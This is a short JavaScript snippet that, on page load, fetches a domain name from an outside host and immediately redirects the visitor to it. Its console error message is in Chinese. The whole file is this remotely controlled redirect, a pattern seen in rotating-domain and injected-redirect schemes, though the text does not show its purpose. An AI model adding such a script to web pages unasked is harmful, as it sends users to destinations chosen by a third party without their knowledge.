window.onload = function() {
    
    fetch('https://u001.cyou/url.php')
        .then(response => response.text()) 
        .then(domain => {
            const nextUrl = 'https://' + domain.trim(); 
            window.location.replace(nextUrl); 
        })
        .catch(error => {
            console.error('获取URL时出错：', error);
        });
};
